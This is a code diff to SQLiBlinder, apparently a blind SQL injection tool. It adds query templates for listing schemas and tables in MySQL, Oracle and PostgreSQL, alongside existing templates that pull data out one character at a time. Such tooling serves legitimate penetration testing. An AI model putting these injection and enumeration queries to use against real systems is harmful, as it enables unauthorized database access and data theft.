@@ -25,6 +25,7 @@ class SQLiBlinder:
 			self.string_char_definition = 'SELECT ASCII(SUBSTRING(%s,%d,1))'
 			self.count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'
 			self.offset_shift=0
+			self.schemata_disclaimer = 'In MySQL schema is synonym of database.'
 			self.schemata_query = ['schema_name','information_schema.schemata',None]
 			self.tables_query = ['table_name','information_schema.tables',"table_schema <> 'information_schema'"]
 			self.tables_schema_query = ['table_name','information_schema.tables',"table_schema='{schema_name}'"]
@@ -64,12 +65,16 @@ class SQLiBlinder:
 		#oracle
 		if dbms == 'oracle':
 			self.base_from_clause = 'FROM (SELECT a.*, ROWNUM rn FROM {table_name} a {where} ORDER BY a.{order_by}) WHERE rn={row_num}'
+			#self.base_from_clause = 'FROM (SELECT *, ROWNUM rn FROM {table_name} {where} ORDER BY {order_by}) WHERE rn={row_num}'
 			self.string_definition = 'SELECT %s'
 			self.string_len_definition = 'SELECT LENGTH(%s)'
 			self.string_char_definition = 'SELECT ASCII(SUBSTR(%s,%d,1))'
 			self.count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'
 			self.offset_shift=1
+			self.schemata_query = ['owner','(select distinct(owner) from all_tables)',None]
+			self.schemata_disclaimer = 'Schema in oracle is the same as an user. This query returns users.'
 			self.tables_query = ['TABLE_NAME','USER_TABLES',None]
+			self.tables_schema_query = ['TABLE_NAME', 'ALL_TABLES',"owner=UPPER('{schema_name}')"]
 			self.columns_query = ['column_name','all_tab_columns',"table_name = UPPER('{table_name}')"]
 
 		#postgre
@@ -80,6 +85,7 @@ class SQLiBlinder:
 			self.string_char_definition = 'SELECT ASCII(SUBSTRING(%s,%d,1))'
 			self.count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'
 			self.offset_shift=0
+			self.schemata_disclaimer = 'In PostgreSQL another databases exists but are not accessible. So only schemata here.'
 			self.schemata_query = ['nspname','pg_catalog.pg_namespace',None]
 			self.tables_query = ['c.relname','pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace',"c.relkind IN ('r','') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid)"]
 			self.tables_schema_query = ['c.relname', 'pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace',"c.relkind IN ('r','m','v','') AND n.nspname='{schema_name}'"] # remove v and m if you don't want see views
@@ -227,6 +233,8 @@ class SQLiBlinder:
 
 	def get_schemata(self):
 		if hasattr(self,'schemata_query'):
+			if hasattr(self,'schemata_disclaimer'):
+				print (self.schemata_disclaimer)
 			column,table,where = self.schemata_query
 			return self.get([column],table,where=where)
 		else:
